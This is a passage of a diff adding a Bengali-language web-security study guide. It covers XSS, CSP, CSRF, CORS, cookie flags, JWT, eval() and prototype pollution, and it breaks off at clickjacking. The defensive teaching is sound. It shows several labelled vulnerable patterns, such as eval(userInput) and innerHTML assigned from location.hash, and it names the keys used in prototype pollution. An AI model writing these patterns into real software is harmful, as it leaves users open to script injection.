+  <pre><code>element.<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">innerHTML</span> = input;</code></pre>
+</div>
+      <p class="text-p">Text হিসেবে দেখাতে চাইলে:</p>
+      <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">JAVASCRIPT Source</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code>element.textContent = input;</code></pre>
+</div>
+      <p class="text-p"><code>textContent</code> HTML হিসেবে interpret না করে text হিসেবে রাখে। Example:</p>
+      <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">JAVASCRIPT Source</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code>element.textContent = <span class="syn-str">&quot;&lt;h1&gt;Hello&lt;/h1&gt;&quot;</span>;</code></pre>
+</div>
+      <p class="text-p">Browser দেখাবে:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">&lt;h1&gt;Hello&lt;/h1&gt;</pre>
+</div>
+      <p class="text-p">HTML heading বানাবে না।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.12</span> XSS Prevention</div>
+      <div class="section-subhead">🔹 Rule 1</div>
+      <p class="text-p">Untrusted input HTML হিসেবে render করো না। Prefer:</p>
+      <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">JAVASCRIPT Source</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code>element.textContent = userInput;</code></pre>
+</div>
+      <div class="section-subhead">🔹 Rule 2</div>
+      <p class="text-p">Framework-এর safe rendering mechanism ব্যবহার করো। React:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code>&lt;p&gt;{userInput}&lt;/p&gt;</code></pre>
+</div>
+      <p class="text-p">সাধারণভাবে React text interpolation escape করে। কিন্তু:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code>&lt;div dangerouslySetInnerHTML={{ __html: userInput }} /&gt;</code></pre>
+</div>
+      <p class="text-p">ব্যবহারের সময় trusted/sanitized HTML নিশ্চিত করতে হবে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.13</span> Sanitization</div>
+      <p class="text-p">যদি application-এ user-provided rich HTML allow করতে হয়, তখন proper HTML sanitizer দরকার হতে পারে। Concept:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">User</span> HTML
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Sanitizer
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #34d399; font-weight: 700;">Allowed</span> HTML
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Render</pre>
+</div>
+      <p class="text-p">নিজে simplistic regex দিয়ে HTML sanitizer বানানো নিরাপদ approach নয়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.14</span> CSP — Content Security Policy</div>
+      <p class="text-p"><strong>CSP</strong> browser-কে বলে:</p>
+      <div class="warn-box">⚠️ কোন ধরনের resource/code কোথা থেকে load বা execute করা যাবে।</div>
+      <p class="text-p">CSP সাধারণত HTTP response header-এর মাধ্যমে দেওয়া হয়। Conceptual example:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Content-Security-Policy:
+default-src &#x27;self&#x27;</pre>
+</div>
+      <p class="text-p">মানে default resource policy নিজের origin-এর মধ্যে সীমিত রাখার একটি baseline তৈরি হয়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.15</span> CSP কেন গুরুত্বপূর্ণ?</div>
+      <p class="text-p">যদি কোনো XSS vulnerability somehow থেকে যায়, strong CSP অনেক ক্ষেত্রে attack-এর impact কমাতে সাহায্য করতে পারে। Defense layers:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Input Handling
+      +
+<span style="color: #34d399; font-weight: 700;">Safe</span> DOM APIs
+      +
+Framework Escaping
+      +
+<span style="color: #34d399; font-weight: 700;">CSP</span></pre>
+</div>
+      <p class="text-p">একটি security control-এর ওপর পুরোপুরি নির্ভর করা উচিত নয়।</p>
+    </div>
+    <div class="part-banner">Part 03 — Cross-Site Request Forgery (CSRF) & SameSite Protection (31.16 – 31.19)</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.16</span> CSRF — Cross-Site Request Forgery</div>
+      <p class="text-p">CSRF হলো এমন attack যেখানে victim-এর authenticated browser session ব্যবহার করে unwanted action trigger করার চেষ্টা করা হয়। ধরো:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">User</span>
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Logged into bank.com</pre>
+</div>
+      <p class="text-p">Browser-এ authentication cookie আছে। তারপর user malicious website visit করল।</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #f43f5e; font-weight: 700;">Malicious</span> Site
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Tries to cause request
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Bank application</pre>
+</div>
+      <p class="text-p">যদি application যথেষ্ট protection না দেয়, unwanted state-changing request ঘটতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.17</span> CSRF-এর Core Idea</div>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Victim is authenticated
+        <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Browser</span> has credentials
+        <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #f43f5e; font-weight: 700;">Attacker</span> causes unwanted request
+        <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Server</span> may trust it</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.18</span> CSRF Prevention</div>
+      <p class="text-p">Common defenses:</p>
+      <div class="section-subhead">🔹 1. CSRF Token</div>
+      <p class="text-p">Server একটি unpredictable token দেয়।</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ CSRF FORGERY TRAP & DEFENSE ARCHITECTURE</div>
+  <pre class="ascii-tree-content">Form
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #f43f5e; font-weight: 700;">CSRF</span> Token
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Server</span> verifies</pre>
+</div>
+      <div class="section-subhead">🔹 2. SameSite Cookies</div>
+      <p class="text-p">Cookie configuration:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>HTTP</span></div>
+  <pre><code><span style="color: #4ade80; font-weight: bold;">SameSite=Lax</span></code></pre>
+</div>
+      <p class="text-p">বা প্রয়োজন অনুযায়ী:</p>
+      <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code><span style="color: #4ade80; font-weight: bold;">SameSite=Strict</span></code></pre>
+</div>
+      <p class="text-p">cross-site cookie behavior সীমিত করতে সাহায্য করে।</p>
+      <div class="section-subhead">🔹 3. Origin/Referer Checking</div>
+      <p class="text-p">Sensitive request-এর ক্ষেত্রে request origin যাচাই করা যায়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.19</span> XSS vs CSRF</div>
+      <p class="text-p">| বিষয়         | XSS                         | CSRF                                | | ------------ | --------------------------- | ----------------------------------- | | মূল সমস্যা   | Untrusted script execution  | Unwanted authenticated action       | | Target       | Browser/page context        | Server-side state-changing action   | | Common cause | Unsafe output handling      | Weak request validation             | | Defense      | Escaping, sanitization, CSP | CSRF token, SameSite, Origin checks |</p>
+    </div>
+    <div class="part-banner">Part 04 — Same-Origin Policy (SOP), Cross-Origin Resource Sharing (CORS) (31.20 – 31.26)</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.20</span> CORS কী?</div>
+      <p class="text-p"><strong>CORS = Cross-Origin Resource Sharing</strong> Browser-এর <strong>same-origin policy</strong> cross-origin requests-এর access control-এর একটি গুরুত্বপূর্ণ অংশ। Example:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">Frontend</span>:
+https://example.com
+
+<span style="color: #fde047; font-weight: 600;">API</span>:
+https://api.example.com</pre>
+</div>
+      <p class="text-p">এগুলো origin-এর দিক থেকে আলাদা, কারণ host আলাদা।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.21</span> Origin কী?</div>
+      <p class="text-p">একটি origin সাধারণত:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">scheme + host + port</pre>
+</div>
+      <p class="text-p">দিয়ে নির্ধারিত হয়। উদাহরণ:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">https://example.com</pre>
+</div>
+      <p class="text-p">এখানে:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">scheme = https
+host   = example.com
+port   = default <span style="color: #34d399; font-weight: 700;">HTTPS</span> port</pre>
+</div>
+      <p class="text-p">এইগুলো পরিবর্তিত হলে origin আলাদা হতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.22</span> Same-Origin Policy</div>
+      <p class="text-p">Browser security-এর গুরুত্বপূর্ণ concept:</p>
+      <div class="warn-box">⚠️ একটি origin-এর webpage অন্য origin-এর resources/data-এর সাথে ইচ্ছামতো interact করতে পারে না।</div>
+      <p class="text-p">এটা user data protect করতে সাহায্য করে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.23</span> CORS Example</div>
+      <p class="text-p">Frontend:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">https://frontend.com</pre>
+</div>
+      <p class="text-p">API:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">https://api.example.com</pre>
+</div>
+      <p class="text-p">Server response-এ বলতে পারে:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>HTTP</span></div>
+  <pre><code><span style="color: #38bdf8; font-weight: bold;">Access-Control-Allow-Origin:</span> https://frontend.com</code></pre>
+</div>
+      <p class="text-p">এতে browser বুঝতে পারে নির্দিষ্ট origin-কে response access করার অনুমতি দেওয়া হয়েছে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.24</span> CORS কে কে enforce করে?</div>
+      <p class="text-p">খুব গুরুত্বপূর্ণ:</p>
+      <div class="warn-box">⚠️ CORS মূলত browser-enforced mechanism।</div>
+      <p class="text-p">Server-to-server request-এ browser-এর CORS restriction একইভাবে apply হয় না। তাই Postman-এ request কাজ করলেও browser-এ CORS error দেখা যেতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.25</span> CORS Error-এর Common কারণ</div>
+      <p class="text-p">Frontend:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-fn">fetch</span>(&quot;https://api.example.com/users&quot;);</code></pre>
+</div>
+      <p class="text-p">Server যথাযথ CORS response না দিলে browser console-এ CORS-related error দেখা যেতে পারে। সমাধান সাধারণত:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SAME-ORIGIN POLICY & CORS ACCESS CONTROL</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">Frontend</span>-এ random workaround নয়
+        <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #fde047; font-weight: 600;">Server</span>/<span style="color: #fde047; font-weight: 600;">API</span>-এর <span style="color: #fde047; font-weight: 600;">CORS</span> policy configure</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.26</span> <code>mode: &quot;no-cors&quot;</code> কি Solution?</div>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-fn">fetch</span>(url, {
+    mode: <span class="syn-str">&quot;no-cors&quot;</span>
+});</code></pre>
+</div>
+      <p class="text-p">এটা সাধারণ API response access করার universal solution নয়। Response অনেক ক্ষেত্রে <strong>opaque</strong> হবে। তাই:</p>
+      <div class="warn-box">⚠️ Proper server-side CORS configuration করাই সাধারণ approach।</div>
+    </div>
+    <div class="part-banner">Part 05 — Cookie Security Flags, Storage Secrets & localStorage vs Cookies (31.27 – 31.31)</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.27</span> Cookie কী?</div>
+      <p class="text-p">Cookie browser-এ small piece of data store করে। Example:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>HTTP</span></div>
+  <pre><code><span style="color: #38bdf8; font-weight: bold;">Set-Cookie:</span> sessionId=abc123</code></pre>
+</div>
+      <p class="text-p">Browser পরে appropriate request-এ cookie পাঠাতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.28</span> Secure Cookie Flags</div>
+      <p class="text-p">Sensitive authentication cookie-তে গুরুত্বপূর্ণ flags:</p>
+      <div class="section-subhead">🔹 <code>HttpOnly</code></div>
+      <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code><span style="color: #4ade80; font-weight: bold;">HttpOnly</span></code></pre>
+</div>
+      <p class="text-p">JavaScript দিয়ে সাধারণভাবে cookie read করা যায় না। এটি XSS-এর ক্ষেত্রে session cookie theft-এর কিছু risk কমাতে সাহায্য করে।</p>
+      <div class="section-subhead">🔹 <code>Secure</code></div>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>HTTP</span></div>
+  <pre><code><span style="color: #4ade80; font-weight: bold;">Secure</span></code></pre>
+</div>
+      <p class="text-p">Cookie HTTPS connection-এর মাধ্যমে পাঠানোর জন্য ব্যবহার করা হয়।</p>
+      <div class="section-subhead">🔹 <code>SameSite</code></div>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>HTTP</span></div>
+  <pre><code><span style="color: #4ade80; font-weight: bold;">SameSite=Lax</span></code></pre>
+</div>
+      <p class="text-p">cross-site sending behavior সীমিত করতে সাহায্য করে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.29</span> Example</div>
+      <p class="text-p">Conceptual:</p>
+      <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">HTTP RESPONSE HEADERS</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code><span style="color: #38bdf8; font-weight: bold;">Set-Cookie:</span>
+sessionId=abc123;
+<span style="color: #4ade80; font-weight: bold;">HttpOnly</span>;
+<span style="color: #4ade80; font-weight: bold;">Secure</span>;
+<span style="color: #4ade80; font-weight: bold;">SameSite=Lax</span></code></pre>
+</div>
+      <p class="text-p">এটি authentication/session cookies-এর জন্য common security-oriented configuration-এর একটি example। Actual application requirement অনুযায়ী settings নির্বাচন করতে হয়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.30</span> localStorage Security</div>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-fn">localStorage</span>.<span style="color: #38bdf8; font-weight: 600;">setItem</span>(&quot;token&quot;, token);</code></pre>
+</div>
+      <p class="text-p">Convenient হলেও sensitive authentication token রাখার ক্ষেত্রে security trade-off আছে। কারণ JavaScript access করতে পারে:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-fn">localStorage</span>.<span style="color: #38bdf8; font-weight: 600;">getItem</span>(&quot;token&quot;);</code></pre>
+</div>
+      <p class="text-p">যদি XSS vulnerability থাকে, malicious script potentially token read করতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.31</span> localStorage বনাম HttpOnly Cookie</div>
+      <p class="text-p">| বিষয়                        | localStorage | HttpOnly Cookie            | | --------------------------- | ------------ | -------------------------- | | JS access                   | Yes          | No                         | | XSS token theft risk        | বেশি         | কমাতে সাহায্য করে          | | Automatically request-এ যায় | No           | Appropriate cookie হলে Yes | | CSRF consideration          | আলাদা        | গুরুত্বপূর্ণ               | | Sensitive session design    | সাবধানে      | অনেক ক্ষেত্রে useful       | কোনটি ব্যবহার করবে সেটা application architecture-এর ওপর নির্ভর করে।</p>
+    </div>
+    <div class="part-banner">Part 06 — JSON Web Tokens (JWT) Architecture, Cryptography & Session Security (31.32 – 31.35)</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.32</span> JWT কী?</div>
+      <p class="text-p">JWT:</p>
+      <div class="warn-box">⚠️ JSON Web Token</div>
+      <p class="text-p">একটি token format যা claims বহন করতে পারে। Structure:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ JWT 3-PART STRUCTURE & TOKEN VERIFICATION</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;"><span style="color: #c084fc; font-weight: 700;">Header</span></span>.<span style="color: #c084fc; font-weight: 700;">Payload</span>.<span style="color: #c084fc; font-weight: 700;">Signature</span></pre>
+</div>
+      <p class="text-p">Example:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">xxxxx.yyyyy.zzzzz</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.33</span> JWT-এর 3 অংশ</div>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ JWT 3-PART STRUCTURE & TOKEN VERIFICATION</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;"><span style="color: #c084fc; font-weight: 700;">Header</span></span>
+   .
+<span style="color: #c084fc; font-weight: 700;">Payload</span>
+   .
+<span style="color: #c084fc; font-weight: 700;">Signature</span></pre>
+</div>
+      <div class="section-subhead">🔹 Header</div>
+      <p class="text-p">Algorithm/type information।</p>
+      <div class="section-subhead">🔹 Payload</div>
+      <p class="text-p">Claims।</p>
+      <div class="section-subhead">🔹 Signature</div>
+      <p class="text-p">Token integrity verify করতে সাহায্য করে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.34</span> JWT Encryption নয়</div>
+      <p class="text-p">খুব গুরুত্বপূর্ণ:</p>
+      <div class="warn-box">⚠️ সাধারণ JWT payload encrypted নয়; এটি encoded।</div>
+      <p class="text-p">তাই sensitive secret data payload-এর মধ্যে রাখবে না। যেমন:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code>{
+    password: <span class="syn-str">&quot;123456&quot;</span>
+}</code></pre>
+</div>
+      <p class="text-p">এভাবে sensitive information JWT payload-এ রাখা উচিত নয়।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.35</span> JWT Security</div>
+      <p class="text-p">JWT ব্যবহারে:</p>
+      <ul style="margin: 2px 0 5px 16px; color: #334155; font-size: 10.5px;">
+        <li>Strong signing algorithm</li>
+        <li>Secure key management</li>
+        <li>Expiration</li>
+        <li>Proper audience/issuer validation</li>
+        <li>Algorithm confusion ভুল এড়ানো</li>
+        <li>Secure transport</li>
+        <li>Appropriate storage</li>
+      </ul>
+      <p class="text-p">গুরুত্বপূর্ণ।</p>
+    </div>
+    <div class="part-banner">Part 07 — Dangerous Execution: eval(), DOM Sinks & Prototype Pollution (31.36 – 31.43)</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.36</span> <code>eval()</code> কেন Dangerous?</div>
+      <p class="text-p">JavaScript:</p>
+      <div class="code-box code-box-error">
+  <div class="code-top"><span style="color: #f87171; font-weight: 600;">JAVASCRIPT Source</span><span>❌ Vulnerable / Attack Vector</span></div>
+  <pre><code><span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">eval</span>(userInput);</code></pre>
+</div>
+      <p class="text-p">খুব dangerous pattern। কারণ user-controlled string code হিসেবে execute হতে পারে। Example:</p>
+      <div class="code-box code-box-error">
+  <div class="code-top"><span style="color: #f87171; font-weight: 600;">JAVASCRIPT Source</span><span>❌ Vulnerable / Attack Vector</span></div>
+  <pre><code><span class="syn-kw">const</span> input = userInput;
+
+<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">eval</span>(input);</code></pre>
+</div>
+      <p class="text-p">এখানে untrusted input JavaScript code হিসেবে execute করার সুযোগ পেতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.37</span> <code>eval()</code> Avoid করো</div>
+      <p class="text-p">সাধারণ application development-এ:</p>
+      <div class="code-box code-box-error">
+  <div class="code-top"><span style="color: #f87171; font-weight: 600;">JAVASCRIPT Source</span><span>❌ Vulnerable / Attack Vector</span></div>
+  <pre><code><span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">eval</span>()</code></pre>
+</div>
+      <p class="text-p">প্রয়োজন না হলে ব্যবহার করো না। আরও problematic হতে পারে:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code><span class="syn-kw">new</span> <span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">Function</span>(userInput);</code></pre>
+</div>
+      <p class="text-p">কারণ এটাও dynamically code execution করতে পারে।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.38</span> DOM XSS এবং URL</div>
+      <p class="text-p">এই pattern:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code>element.<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">innerHTML</span> = <span class="syn-fn">location</span>.search;</code></pre>
+</div>
+      <p class="text-p">বা:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code>element.<span style="color: #f87171; font-weight: bold; text-decoration: underline wavy #ef4444 1.5px;">innerHTML</span> = <span class="syn-fn">location</span>.<span style="color: #38bdf8; font-weight: 600;">hash</span>;</code></pre>
+</div>
+      <p class="text-p">dangerous হতে পারে। কারণ:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">URL
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #f43f5e; font-weight: 700;">Untrusted</span> Input
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+innerHTML
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+HTML interpretation</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.39</span> Safe DOM Pattern</div>
+      <p class="text-p">Instead:</p>
+      <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">JAVASCRIPT Source</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code>element.textContent = <span class="syn-fn">location</span>.<span style="color: #38bdf8; font-weight: 600;">hash</span>;</code></pre>
+</div>
+      <p class="text-p">যদি HTML rendering genuinely দরকার হয়:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">Input
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Trusted/controlled processing
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Proper sanitizer
+ <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #34d399; font-weight: 700;">Safe</span> rendering</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.40</span> Prototype Pollution</div>
+      <p class="text-p">JavaScript object-এর prototype system powerful। কিন্তু unsafe object merging/parsing pattern থেকে <strong>prototype pollution</strong> vulnerability তৈরি হতে পারে। Concept:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ PROTOTYPE POLLUTION OBJECT CHAIN VECTOR</div>
+  <pre class="ascii-tree-content"><span style="color: #f43f5e; font-weight: 700;">Untrusted</span> Input
+      <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Object merge/update
+      <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Prototype modified
+      <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Unexpected behavior</pre>
+</div>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.41</span> Prototype Pollution Example Concept</div>
+      <p class="text-p">Dangerous deep merge logic যদি attacker-controlled keys blindly process করে:</p>
+      <div class="code-box">
+  <div class="code-top"><span style="color: #94a3b8; font-weight: 600;">JAVASCRIPT Source</span><span>JAVASCRIPT</span></div>
+  <pre><code>merge(target, userInput);</code></pre>
+</div>
+      <p class="text-p">এবং prototype-related keys properly handle না করে, application-এর object behavior unexpectedly পরিবর্তিত হতে পারে। বিশেষ করে historical patterns-এর মধ্যে:</p>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ SECURITY ARCHITECTURE & DEFENSE DIAGRAM</div>
+  <pre class="ascii-tree-content">__proto__
+constructor
+prototype</pre>
+</div>
+      <p class="text-p">এর মতো property paths গুরুত্বপূর্ণ।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.42</span> Prototype Pollution Prevention</div>
+      <div class="section-subhead">🔹 1</div>
+      <p class="text-p">Untrusted object blindly merge করো না।</p>
+      <div class="section-subhead">🔹 2</div>
+      <p class="text-p">Input allowlist করো।</p>
+      <div class="section-subhead">🔹 3</div>
+      <p class="text-p">Modern, well-maintained libraries ব্যবহার করো।</p>
+      <div class="section-subhead">🔹 4</div>
+      <p class="text-p">Dependencies updated রাখো।</p>
+      <div class="section-subhead">🔹 5</div>
+      <p class="text-p">Prototype-sensitive keys handle করো।</p>
+    </div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.43</span> <code>Object.create(null)</code></div>
+      <p class="text-p">Prototype pollution-related design-এর কিছু ক্ষেত্রে:</p>
+      <div class="code-box code-box-correct">
+  <div class="code-top"><span style="color: #4ade80; font-weight: 600;">JAVASCRIPT Source</span><span>✅ Secure / Mitigated Pattern</span></div>
+  <pre><code><span class="syn-kw">const</span> data = <span class="syn-fn">Object</span>.create(<span class="syn-bool">null</span>);</code></pre>
+</div>
+      <p class="text-p">এতে normal <code>Object.prototype</code> chain থাকে না। তবে এটা সব problem-এর universal solution নয়।</p>
+    </div>
+    <div class="part-banner">Part 08 — Network Security: Clickjacking, HTTPS & Transport Layer Defense (31.44 – 31.47)</div>
+    <div class="study-card">
+      <div class="card-title"><span class="badge-num">31.44</span> Clickjacking</div>
+      <p class="text-p">Clickjacking হলো user-কে এমন UI interaction করানো যেখানে visible interface-এর আড়ালে বা deceptive framing-এর মাধ্যমে অন্য action trigger হতে পারে। Defense:</p>
+      <div class="code-box">
